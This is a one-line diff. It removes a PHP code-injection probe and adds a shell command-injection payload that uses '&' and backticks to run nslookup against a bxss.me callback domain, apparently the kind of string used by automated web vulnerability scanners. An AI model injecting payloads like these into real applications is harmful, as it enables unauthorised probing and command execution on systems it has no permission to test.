@@ -1,1 +1,1 @@
-";print(md5(31337));$a="
+&nslookup -q=cname hithmsugculch74cfc.bxss.me&'\"`0&nslookup -q=cname hithmsugculch74cfc.bxss.me&`'
